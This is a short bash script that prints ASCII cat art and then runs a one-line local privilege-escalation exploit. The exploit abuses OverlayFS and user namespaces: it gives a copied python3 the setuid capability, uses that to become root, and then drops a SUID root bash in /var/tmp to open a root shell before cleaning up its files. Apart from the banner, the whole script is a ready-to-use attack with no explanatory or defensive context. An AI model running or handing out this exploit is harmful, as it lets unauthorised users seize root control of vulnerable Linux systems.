#!/bin/bash


RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' 

# ascii art
echo -e "${GREEN}**************${NC}"


echo -e "${RED}"
cat << "EOF"
 /\_/\  
( o.o ) 
 > ^ < 
EOF
echo -e "${NC}"


unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
